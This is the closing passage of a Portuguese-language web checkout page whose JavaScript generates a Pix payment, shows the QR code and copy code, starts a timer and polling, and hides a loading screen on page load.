      btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 512 512"><path fill="currentColor" d="M112.57 391.19c20.056 0 38.928-7.808 53.12-22l79.616-79.616c5.632-5.632 15.36-5.6 20.992 0l79.936 79.936c14.176 14.176 33.056 22 53.12 22h15.745l-100.833 100.8c-41.408 41.44-108.64 41.44-150.048 0L63.394 391.19h49.175zm286.784-271.36c-20.064 0-38.944 7.808-53.12 22l-79.936 79.936c-5.824 5.824-15.168 5.824-20.992 0l-79.616-79.616c-14.192-14.192-33.072-22-53.12-22H63.394l100.832-100.8c41.408-41.44 108.64-41.44 150.048 0L414.655 119.9l-15.3-.07zM476.414 173.3l-63.713-63.744-78.815 78.88c-20.576 20.576-56.48 20.576-77.056 0l-79.68-79.68a38.555 38.555 0 0 0-27.232-11.2H108.19L44.254 163.5c-41.44 41.408-41.44 108.64 0 150.048l63.936 63.968h41.152c10.24 0 19.84-3.968 27.04-11.2l79.68-79.68c10.496-10.496 24.512-16.288 39.36-16.288s28.864 5.792 39.36 16.288l80 80a38.515 38.515 0 0 0 27.232 11.2h40.64l63.68-63.648c41.44-41.44 41.44-108.64.062-150.048z"/></svg> Gerar Pix';
      show('screen-checkout');
      return;
    }

    // populate PIX screen
    document.getElementById('pix-qr-img').src  = data.pix?.pix_qrcode_image  || '';
    document.getElementById('pix-code-text').value = data.pix?.pix_qrcode_text || '';

    show('screen-pix');
    startTimer(10);
    startPolling(data.payment_code);

  } catch (err) {
    alert('Erro de conexão. Verifique sua internet e tente novamente.');
    btn.disabled = false;
    btn.textContent = 'Gerar Pix';
    show('screen-checkout');
  }
});

// ── init ──────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  setTimeout(() => {
    document.getElementById('screen-loading').style.display = 'none';
    show('screen-checkout');
  }, 800);
});
</script>
</body>
</html>
